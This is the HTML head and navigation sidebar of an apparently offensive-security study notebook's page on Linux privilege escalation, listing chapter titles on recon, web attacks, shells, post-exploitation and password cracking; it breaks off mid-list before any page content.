<!DOCTYPE html>
<html lang="en"><head>
        <meta charset="UTF-8">
        <meta content="text/html; charset=UTF-8" http-equiv="Content-Type">
        <title>Privilege Escalation - Linux Â· pentestbook</title>
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="description" content="">
        <meta name="generator" content="GitBook 3.2.2">
        <meta name="author" content="chryzsh">
        
        
    
    <link rel="stylesheet" href="Privilege%20Escalation%20-%20Linux%20%C2%B7%20pentestbook_files/style.css">

    
            
                
                <link rel="stylesheet" href="Privilege%20Escalation%20-%20Linux%20%C2%B7%20pentestbook_files/plugin.css">
                
            
                
                <link rel="stylesheet" href="Privilege%20Escalation%20-%20Linux%20%C2%B7%20pentestbook_files/website_002.css">
                
            
                
                <link rel="stylesheet" href="Privilege%20Escalation%20-%20Linux%20%C2%B7%20pentestbook_files/search.css">
                
            
                
                <link rel="stylesheet" href="Privilege%20Escalation%20-%20Linux%20%C2%B7%20pentestbook_files/website.css">
                
            
        

    

    
        
        <link rel="stylesheet" href="Privilege%20Escalation%20-%20Linux%20%C2%B7%20pentestbook_files/website_003.css">
        
    
        
    
        
    
        
    
        
    
        
    

        
    
    
    <meta name="HandheldFriendly" content="true">
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="https://chryzsh.gitbooks.io/pentestbook/content/gitbook/images/apple-touch-icon-precomposed-152.png">
    <link rel="shortcut icon" href="https://chryzsh.gitbooks.io/pentestbook/content/gitbook/images/favicon.ico" type="image/x-icon">

    
    <link rel="next" href="https://chryzsh.gitbooks.io/pentestbook/content/privilege_escalation_windows.html">
    
    
    <link rel="prev" href="https://chryzsh.gitbooks.io/pentestbook/content/getting_meterpreter_shell.html">
    

    
<style>
    .book .book-summary .book-search,
    .book .book-summary ul.summary {
        position: relative;
        top: auto;
        left: auto;
        right: auto;
        bottom: auto;
    }
    .book-summary {
        display: -webkit-box;
        display: -moz-box;
        display: -ms-flexbox;
        display: -webkit-flex;
        display: flex;
        flex-direction: column;
        -webkit-box-orient: vertical;
        -webkit-box-direction: normal;
        overflow-y: auto;
    }
    .book-summary > nav {
        flex: 1 1 auto;
        overflow-y: auto;
        overflow-y: overlay;
    }
    .gl-wrapper {
        margin: 0;
        display: block;
        padding: 0;
        position: relative;
        line-height: 15px;
        background: #fafafa;
    }
    .gl-wrapper:before {
        background: -webkit-linear-gradient(to bottom, rgba(250,250,250,0) 0%, #fafafa 100%);
        background: -moz-linear-gradient(to bottom, rgba(250,250,250,0) 0%, #fafafa 100%);
        top: -24px;
        width: 100%;
        height: 24px;
        content: "";
        display: block;
        position: absolute;
        background: linear-gradient(to bottom, rgba(250,250,250,0) 0%, #fafafa 100%);
    }
    .book.color-theme-1 .gl-wrapper {
        background: #121212;
    }
    .book.color-theme-1 .gl-wrapper:before {
        background: -webkit-linear-gradient(to bottom, rgba(18,18,18,0) 0%, #121212 100%);
        background: -moz-linear-gradient(to bottom, rgba(18,18,18,0) 0%, #121212 100%);
        background: linear-gradient(to bottom, rgba(18,18,18,0) 0%, #121212 100%);
    }
    .book.color-theme-2 .gl-wrapper {
        background: #2e3243;
    }
    .book.color-theme-2 .gl-wrapper:before {
        background: -webkit-linear-gradient(to bottom, rgba(46,50,67,0) 0%, #2e3243 100%);
        background: -moz-linear-gradient(to bottom, rgba(46,50,67,0) 0%, #2e3243 100%);
        background: linear-gradient(to bottom, rgba(46,50,67,0) 0%, #2e3243 100%);
    }
    .gl-wrapper .gitbook-link {
        display: -webkit-box;
        display: -moz-box;
        display: -ms-flexbox;
        display: -webkit-flex;
        color: #9DAAB6;
        margin: 16px;
        display: flex;
        padding: 0;
        align-items: center;
        margin-left: 32px;
        padding-top: 8px;
        padding-left: 16px;
        border-radius: 3px;
        padding-right: 16px;
        padding-bottom: 8px;
        text-decoration: none;
        background-color: #E6ECF1;
        -webkit-box-align: center;
    }
    .gl-wrapper .tm-logo {
        margin: 0;
        display: block;
        padding: 0;
        font-size: 40px;
    }
    .gl-wrapper .tm-content {
        flex: 1;
        margin: 0;
        display: block;
        padding: 0;
        padding-left: 16px;
    }
    .gl-wrapper .tm-content .container {
        margin: 0;
        display: block;
        padding: 0;
    }
    .gl-wrapper .tm-content .tm-container .tm-text {
        font-size: 12px;
        font-family: "Roboto", sans-serif;
        font-weight: 400;
        line-height: 1.625;
    }
</style></head>
    <body>
        
<div class="book without-animation with-summary font-size-2 font-family-1">
    <div class="book-summary">
        
            
<div id="book-search-input" role="search">
    <input type="text" placeholder="Type to search">
</div>

            
                <nav role="navigation">
                


<ul class="summary">
    
    
    
        
        <li>
            <a href="https://www.gitbook.com/book/chryzsh/pentestbook" target="_blank" class="custom-link">pentestbook</a>
        </li>
    
    

    
    <li class="divider"></li>
    

    
        
        
    
        <li class="chapter " data-level="1.1" data-path="./">
            
                <a href="https://chryzsh.gitbooks.io/pentestbook/content/">
            
                    
                    Introduction
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2" data-path="todo.html">
            
                <a href="https://chryzsh.gitbooks.io/pentestbook/content/todo.html">
            
                    
                    Todo
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.3" data-path="random-tools.html">
            
                <a href="https://chryzsh.gitbooks.io/pentestbook/content/random-tools.html">
            
                    
                    Random tools
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4" data-path="the_basics.html">
            
                <a href="https://chryzsh.gitbooks.io/pentestbook/content/the_basics.html">
            
                    
                    The Basics
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.4.1" data-path="linux.html">
            
                <a href="https://chryzsh.gitbooks.io/pentestbook/content/linux.html">
            
                    
                    Linux
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.4.1.1" data-path="bash-scripting.html">
            
                <a href="https://chryzsh.gitbooks.io/pentestbook/content/bash-scripting.html">
            
                    
                    Bash-scripting
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.1.2" data-path="basics_of_linux.html">
            
                <a href="https://chryzsh.gitbooks.io/pentestbook/content/basics_of_linux.html">
            
                    
                    Basics of Linux
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.1.3" data-path="vim.html">
            
                <a href="https://chryzsh.gitbooks.io/pentestbook/content/vim.html">
            
                    
                    Vim
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.4.2" data-path="windows.html">
            
                <a href="https://chryzsh.gitbooks.io/pentestbook/content/windows.html">
            
                    
                    Windows
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.4.2.1" data-path="basics_of_windows.html">
            
                <a href="https://chryzsh.gitbooks.io/pentestbook/content/basics_of_windows.html">
            
                    
                    Basics of Windows
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.2.2" data-path="powershell.html">
            
                <a href="https://chryzsh.gitbooks.io/pentestbook/content/powershell.html">
            
                    
                    PowerShell
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.2.3" data-path="powershell_scripting2.html">
            
                <a href="https://chryzsh.gitbooks.io/pentestbook/content/powershell_scripting2.html">
            
                    
                    PowerShell Scripting
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.2.4" data-path="cmd.html">
            
                <a href="https://chryzsh.gitbooks.io/pentestbook/content/cmd.html">
            
                    
                    CMD
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.4.3" data-path="scripting_with_python.html">
            
                <a href="https://chryzsh.gitbooks.io/pentestbook/content/scripting_with_python.html">
            
                    
                    Scripting With Python
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.4.3.1" data-path="python_fundamentals.html">
            
                <a href="https://chryzsh.gitbooks.io/pentestbook/content/python_fundamentals.html">
            
                    
                    Python Fundamentals
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.3.2" data-path="connections.html">
            
                <a href="https://chryzsh.gitbooks.io/pentestbook/content/connections.html">
            
                    
                    Useful Scripts
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.4.4" data-path="transfering_files2.html">
            
                <a href="https://chryzsh.gitbooks.io/pentestbook/content/transfering_files2.html">
            
                    
                    Transferring Files
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.4.4.1" data-path="transfering_files.html">
            
                <a href="https://chryzsh.gitbooks.io/pentestbook/content/transfering_files.html">
            
                    
                    Transfering Files on Linux
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.4.2" data-path="transfering_files_to_windows.html">
            
                <a href="https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html">
            
                    
                    Transfering files on Windows
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.4.5" data-path="firewalls.html">
            
                <a href="https://chryzsh.gitbooks.io/pentestbook/content/firewalls.html">
            
                    
                    Firewalls
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.6" data-path="general_tips.html">
            
                <a href="https://chryzsh.gitbooks.io/pentestbook/content/general_tips.html">
            
                    
                    General tips and tricks
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.5" data-path="scanning.html">
            
                <a href="https://chryzsh.gitbooks.io/pentestbook/content/scanning.html">
            
                    
                    Recon and Information Gathering Phase
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.5.1" data-path="passive_information_gatherig.html">
            
                <a href="https://chryzsh.gitbooks.io/pentestbook/content/passive_information_gatherig.html">
            
                    
                    Passive Information Gatherig
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.5.1.1">
            
                <span>
            
                    
                    Identify IP-addresses and Subdomains
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.5.1.1.1">
            
                <span>
            
                    
                    Identify IP-addresses
            
                </span>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.1.1.2" data-path="find_subdomains.html">
            
                <a href="https://chryzsh.gitbooks.io/pentestbook/content/find_subdomains.html">
            
                    
                    Find Subdomains
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.5.1.1.2.1" data-path="dns_basics.html">
            
                <a href="https://chryzsh.gitbooks.io/pentestbook/content/dns_basics.html">
            
                    
                    DNS Basics
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.1.1.2.2" data-path="finding_subdomains.html">
            
                <a href="https://chryzsh.gitbooks.io/pentestbook/content/finding_subdomains.html">
            
                    
                    Finding subdomains
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.1.1.2.3" data-path="dns_zone_transfer_attack.html">
            
                <a href="https://chryzsh.gitbooks.io/pentestbook/content/dns_zone_transfer_attack.html">
            
                    
                    DNS Zone Transfer Attack
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.5.1.2" data-path="email_harvesting.html">
            
                <a href="https://chryzsh.gitbooks.io/pentestbook/content/email_harvesting.html">
            
                    
                    Identifying People
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.1.3" data-path="google_hacking.html">
            
                <a href="https://chryzsh.gitbooks.io/pentestbook/content/google_hacking.html">
            
                    
                    Search Engine Discovery
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.1.4" data-path="identifying-technology-stack.html">
            
                <a href="https://chryzsh.gitbooks.io/pentestbook/content/identifying-technology-stack.html">
            
                    
                    Identifying Technology Stack
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.5.2" data-path="active_information_gathering.html">
            
                <a href="https://chryzsh.gitbooks.io/pentestbook/content/active_information_gathering.html">
            
                    
                    Active Information Gathering
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.5.2.1" data-path="port_scanning.html">
            
                <a href="https://chryzsh.gitbooks.io/pentestbook/content/port_scanning.html">
            
                    
                    Port Scanning
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.2.2" data-path="active-directory.html">
            
                <a href="https://chryzsh.gitbooks.io/pentestbook/content/active-directory.html">
            
                    
                    Active Directory mapping
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.6" data-path="vulnerability_analysi1s.html">
            
                <a href="https://chryzsh.gitbooks.io/pentestbook/content/vulnerability_analysi1s.html">
            
                    
                    Vulnerability analysis
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.6.1" data-path="server-side-vulnerabilities.html">
            
                <a href="https://chryzsh.gitbooks.io/pentestbook/content/server-side-vulnerabilities.html">
            
                    
                    Server-side Vulnerabilities
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.6.1.1" data-path="list_of_common_ports.html">
            
                <a href="https://chryzsh.gitbooks.io/pentestbook/content/list_of_common_ports.html">
            
                    
                    Common ports\/services and how to use them
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.6.1.2" data-path="port_knocking.html">
            
                <a href="https://chryzsh.gitbooks.io/pentestbook/content/port_knocking.html">
            
                    
                    Port Knocking
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.6.2" data-path="web-services.html">
            
                <a href="https://chryzsh.gitbooks.io/pentestbook/content/web-services.html">
            
                    
                    HTTP - Web Vulnerabilities
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.6.2.1" data-path="common_web-services.html">
            
                <a href="https://chryzsh.gitbooks.io/pentestbook/content/common_web-services.html">
            
                    
                    Common Web-services
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.6.2.2" data-path="waf_-_web_application_firewall.html">
            
                <a href="https://chryzsh.gitbooks.io/pentestbook/content/waf_-_web_application_firewall.html">
            
                    
                    WAF - Web Application Firewall
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.6.2.3" data-path="lead_to_compromise.html">
            
                <a href="https://chryzsh.gitbooks.io/pentestbook/content/lead_to_compromise.html">
            
                    
                    Attacking the System
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.6.2.3.1" data-path="local_file_inclusion.html">
            
                <a href="https://chryzsh.gitbooks.io/pentestbook/content/local_file_inclusion.html">
            
                    
                    Local File Inclusion
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.6.2.3.2" data-path="remote_file_inclusion.html">
            
                <a href="https://chryzsh.gitbooks.io/pentestbook/content/remote_file_inclusion.html">
            
                    
                    Remote File Inclusion
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.6.2.3.3" data-path="web-scanning.html">
            
                <a href="https://chryzsh.gitbooks.io/pentestbook/content/web-scanning.html">
            
                    
                    Hidden Files and Directories
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.6.2.3.4" data-path="sql-injections.html">
            
                <a href="https://chryzsh.gitbooks.io/pentestbook/content/sql-injections.html">
            
                    
                    SQL-Injections
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.6.2.3.5" data-path="nosql-injections.html">
            
                <a href="https://chryzsh.gitbooks.io/pentestbook/content/nosql-injections.html">
            
                    
                    Nosql-Injections
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.6.2.3.6" data-path="xml_external_entity_attack.html">
            
                <a href="https://chryzsh.gitbooks.io/pentestbook/content/xml_external_entity_attack.html">
            
                    
                    XML External Entity Attack
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.6.2.3.7" data-path="bypass_image_upload.html">
            
                <a href="https://chryzsh.gitbooks.io/pentestbook/content/bypass_image_upload.html">
            
                    
                    Bypass File Upload Filtering
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.6.2.3.8" data-path="exposed_version_control.html">
            
                <a href="https://chryzsh.gitbooks.io/pentestbook/content/exposed_version_control.html">
            
                    
                    Exposed Version Control
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.6.2.3.9" data-path="failure-to-restrict-url-access.html">
            
                <a href="https://chryzsh.gitbooks.io/pentestbook/content/failure-to-restrict-url-access.html">
            
                    
                    Failure to Restrict URL Access
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.6.2.4" data-path="attacking_the_user.html">
            
                <a href="https://chryzsh.gitbooks.io/pentestbook/content/attacking_the_user.html">
            
                    
                    Attacking the User
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.6.2.4.1" data-path="clickjacking.html">
            
                <a href="https://chryzsh.gitbooks.io/pentestbook/content/clickjacking.html">
            
                    
                    Clickjacking
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.6.2.4.2" data-path="broken_authentication_or_session_management.html">
            
                <a href="https://chryzsh.gitbooks.io/pentestbook/content/broken_authentication_or_session_management.html">
            
                    
                    Broken Authentication or Session Management
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.6.2.4.3" data-path="text-injection.html">
            
                <a href="https://chryzsh.gitbooks.io/pentestbook/content/text-injection.html">
            
                    
                    Text\/content-injection
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.6.2.4.4" data-path="subdomain_takeover.html">
            
                <a href="https://chryzsh.gitbooks.io/pentestbook/content/subdomain_takeover.html">
            
                    
                    Subdomain Takeover
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.6.2.4.5" data-path="cross_site_request_forgery.html">
            
                <a href="https://chryzsh.gitbooks.io/pentestbook/content/cross_site_request_forgery.html">
            
                    
                    Cross Site Request Forgery
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.6.2.4.6" data-path="cross-site-scripting.html">
            
                <a href="https://chryzsh.gitbooks.io/pentestbook/content/cross-site-scripting.html">
            
                    
                    Cross-site-scripting
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.6.2.4.6.1" data-path="examplesXSS.html">
            
                <a href="https://chryzsh.gitbooks.io/pentestbook/content/examplesXSS.html">
            
                    
                    Examples
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.6.2.4.6.2" data-path="dom-based-xss.html">
            
                <a href="https://chryzsh.gitbooks.io/pentestbook/content/dom-based-xss.html">
            
                    
                    DOM-based XSS
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.6.2.4.7" data-path="browser_vulnerabilities.html">
            
                <a href="https://chryzsh.gitbooks.io/pentestbook/content/browser_vulnerabilities.html">
            
                    
                    Browser Vulnerabilities
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.6.2.4.8" data-path="java_applet.html">
            
                <a href="https://chryzsh.gitbooks.io/pentestbook/content/java_applet.html">
            
                    
                    Java Applet
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.6.2.4.9" data-path="insecure-direct-object-reference-idor.html">
            
                <a href="https://chryzsh.gitbooks.io/pentestbook/content/insecure-direct-object-reference-idor.html">
            
                    
                    Insecure Direct Object Reference (IDOR)
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.6.2.5" data-path="web-notes.html">
            
                <a href="https://chryzsh.gitbooks.io/pentestbook/content/web-notes.html">
            
                    
                    web notes
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.6.3" data-path="automated_vulnerability_scanners.html">
            
                <a href="https://chryzsh.gitbooks.io/pentestbook/content/automated_vulnerability_scanners.html">
            
                    
                    Automated Vulnerability Scanners
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.7" data-path="exploiting.html">
            
                <a href="https://chryzsh.gitbooks.io/pentestbook/content/exploiting.html">
            
                    
                    Exploiting
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.7.1" data-path="social_engineering_-_phishing.html">
            
                <a href="https://chryzsh.gitbooks.io/pentestbook/content/social_engineering_-_phishing.html">
            
                    
                    Social Engineering - Phishing
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.7.2" data-path="default_layout_apache_on_different_versiont.html">
            
                <a href="https://chryzsh.gitbooks.io/pentestbook/content/default_layout_apache_on_different_versiont.html">
            
                    
                    Default Layout of Apache on Different Versions
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.7.3" data-path="reverse-shell.html">
            
                <a href="https://chryzsh.gitbooks.io/pentestbook/content/reverse-shell.html">
            
                    
                    Shells
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.7.4" data-path="webshell.html">
            
                <a href="https://chryzsh.gitbooks.io/pentestbook/content/webshell.html">
            
                    
                    Webshell
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.7.5" data-path="create_shellcode.html">
            
                <a href="https://chryzsh.gitbooks.io/pentestbook/content/create_shellcode.html">
            
                    
                    Generate Shellcode
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.7.6" data-path="editing-exploits.html">
            
                <a href="https://chryzsh.gitbooks.io/pentestbook/content/editing-exploits.html">
            
                    
                    Editing Exploits
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.7.7" data-path="compiling-windows-exploits.html">
            
                <a href="https://chryzsh.gitbooks.io/pentestbook/content/compiling-windows-exploits.html">
            
                    
                    Compiling windows exploits
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.8" data-path="post_exploitation.html">
            
                <a href="https://chryzsh.gitbooks.io/pentestbook/content/post_exploitation.html">
            
                    
                    Post Exploitation
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.8.1" data-path="spawning_shells.html">
            
                <a href="https://chryzsh.gitbooks.io/pentestbook/content/spawning_shells.html">
            
                    
                    Spawning Shells
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.8.2" data-path="getting_meterpreter_shell.html">
            
                <a href="https://chryzsh.gitbooks.io/pentestbook/content/getting_meterpreter_shell.html">
            
                    
                    Meterpreter for Post-Exploitation
            
                </a>
            

            
        </li>
    
        <li class="chapter active" data-level="1.8.3" data-path="privilege_escalation_-_linux.html">
            
                <a href="https://chryzsh.gitbooks.io/pentestbook/content/privilege_escalation_-_linux.html">
            
                    
                    Privilege Escalation - Linux
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.8.4" data-path="privilege_escalation_windows.html">
            
                <a href="https://chryzsh.gitbooks.io/pentestbook/content/privilege_escalation_windows.html">
            
                    
                    Privilege Escalation - Windows
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.8.5" data-path="escaping_restricted_shell.html">
            
                <a href="https://chryzsh.gitbooks.io/pentestbook/content/escaping_restricted_shell.html">
            
                    
                    Escaping Restricted Shell
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.8.6" data-path="bypassing_antivirus.html">
            
                <a href="https://chryzsh.gitbooks.io/pentestbook/content/bypassing_antivirus.html">
            
                    
                    Bypassing antivirus
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.8.7" data-path="loot.html">
            
                <a href="https://chryzsh.gitbooks.io/pentestbook/content/loot.html">
            
                    
                    Loot and Enumerate
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.8.7.1" data-path="loot_windows_-_for_credentials_and_other_stuff.html">
            
                <a href="https://chryzsh.gitbooks.io/pentestbook/content/loot_windows_-_for_credentials_and_other_stuff.html">
            
                    
                    Loot Windows
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.8.7.2" data-path="tcp-dumps_on_pwnd_machines.html">
            
                <a href="https://chryzsh.gitbooks.io/pentestbook/content/tcp-dumps_on_pwnd_machines.html">
            
                    
                    Loot Linux
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.8.8" data-path="persistence.html">
            
                <a href="https://chryzsh.gitbooks.io/pentestbook/content/persistence.html">
            
                    
                    Persistence
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.8.9" data-path="clean_up.html">
            
                <a href="https://chryzsh.gitbooks.io/pentestbook/content/clean_up.html">
            
                    
                    Cover your tracks
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.9" data-path="password-cracking.html">
            
                <a href="https://chryzsh.gitbooks.io/pentestbook/content/password-cracking.html">
            
                    
                    Password Cracking
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.9.1" data-path="generate_custom_wordlist.html">
            
                <a href="https://chryzsh.gitbooks.io/pentestbook/content/generate_custom_wordlist.html">
            
                    
                    Generate Custom Wordlist
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.9.2" data-path="identify_hash_and_crack_it.html">
            
                <a href="https://chryzsh.gitbooks.io/pentestbook/content/identify_hash_and_crack_it.html">
            
                    
                    Offline Password Cracking
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.9.3" data-path="online_password_cracking.html">
            
                <a href="https://chryzsh.gitbooks.io/pentestbook/content/online_password_cracking.html">
            
                    
                    Online Password Cracking
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.9.4" data-path="pass_the_hash_-_reusing_hashes.html">
            
                <a href="https://chryzsh.gitbooks.io/pentestbook/content/pass_the_hash_-_reusing_hashes.html">
            
                    
                    Pass the Hash - Reusing Hashes
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.10" data-path="port_forwarding_and_tunneling.html">
            
                <a href="https://chryzsh.gitbooks.io/pentestbook/content/port_forwarding_and_tunneling.html">
            
                    
                    Pivoting - Port forwarding - Tunneling
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.11" data-path="network_traffic.html">
            
                <a href="https://chryzsh.gitbooks.io/pentestbook/content/network_traffic.html">
            
                    
                    Network traffic analysis
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.11.1" data-path="arp-spoofing.html">
            
                <a href="https://chryzsh.gitbooks.io/pentestbook/content/arp-spoofing.html">
            
                    
                    Arp-spoofing
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.11.1.1" data-path="ssl-strip.html">
            
                <a href="https://chryzsh.gitbooks.io/pentestbook/content/ssl-strip.html">
            
                    
                    SSL-strip
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.11.2" data-path="dns-spoofing.html">
            
                <a href="https://chryzsh.gitbooks.io/pentestbook/content/dns-spoofing.html">
            
                    
                    DNS-spoofing
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.11.3" data-path="wireshark.html">
            
                <a href="https://chryzsh.gitbooks.io/pentestbook/content/wireshark.html">
            
                    
                    Wireshark
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.12" data-path="wifi.html">
            
                <a href="https://chryzsh.gitbooks.io/pentestbook/content/wifi.html">
            
                    
                    Wifi
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.12.1" data-path="wep.html">
            
                <a href="https://chryzsh.gitbooks.io/pentestbook/content/wep.html">
            
                    
                    WEP
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.12.2" data-path="wps.html">
            
                <a href="https://chryzsh.gitbooks.io/pentestbook/content/wps.html">
            
                    
                    WPS
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.12.3" data-path="wpa.html">
            
                <a href="https://chryzsh.gitbooks.io/pentestbook/content/wpa.html">
            
                    
                    WPA
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.13" data-path="physical_access_to_machine.html">
            
                <a href="https://chryzsh.gitbooks.io/pentestbook/content/physical_access_to_machine.html">
            
                    
                    Physical access to machine
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.13.1" data-path="physical_access_to_machine/rubber-ducky.html">
            
                <a href="https://chryzsh.gitbooks.io/pentestbook/content/physical_access_to_machine/rubber-ducky.html">
            
                    
                    Malicious USB drives
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.14" data-path="littearature.html">
            
                <a href="https://chryzsh.gitbooks.io/pentestbook/content/littearature.html">
            
                    
                    Literature
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.15" data-path="oscp.html">
            
                <a href="https://chryzsh.gitbooks.io/pentestbook/content/oscp.html">
            
                    
                    OSCP
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.16" data-path="writeups.html">
            
                <a href="https://chryzsh.gitbooks.io/pentestbook/content/writeups.html">
            
                    
                    Writeups
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.16.1" data-path="writeups/vulnhub.html">
            
                <a href="https://chryzsh.gitbooks.io/pentestbook/content/writeups/vulnhub.html">
            
                    
                    Vulnhub
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.16.1.1" data-path="writeups/vulnhub/quaoar.html">
            
                <a href="https://chryzsh.gitbooks.io/pentestbook/content/writeups/vulnhub/quaoar.html">
            
                    
                    Quaoar
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.16.1.2" data-path="pluck-1.html">
            
